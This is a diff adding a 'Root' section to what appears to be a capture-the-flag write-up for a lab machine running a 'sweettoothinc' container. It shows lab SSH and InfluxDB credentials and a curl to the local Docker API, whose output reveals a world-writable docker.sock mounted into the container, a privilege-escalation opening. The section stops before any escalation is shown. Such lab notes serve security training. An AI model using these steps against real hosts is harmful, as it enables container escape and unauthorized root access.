@@ -248,3 +248,15 @@ ssh uzJk6Ry98d8C@10.10.27.198 -s 2222
 cat user.txt
 
 ```
+
+## Root
+
+```
+influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database creds"
+```
+
+```
+curl localhost:8080/containers/json     
+
+[{"Id":"c7acb13c7dd9a92750122ebc3102ba83a1d82e47ef8685431c43a0bd37ce5115","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1627323898,"Ports":[{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up 2 hours","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"f838087a496218cb60d6bf32ba200deac5ab819aed274530d3b2da3dd92ca614","EndpointID":"e98ef99d7058c3b72002fd5379f06091e36dde105e404475e37a580a7e3fd039","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"d370a5f902b5a20a296b108629f2d7dd17e9b9740c4947720a22551a2480e4ed","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
+```
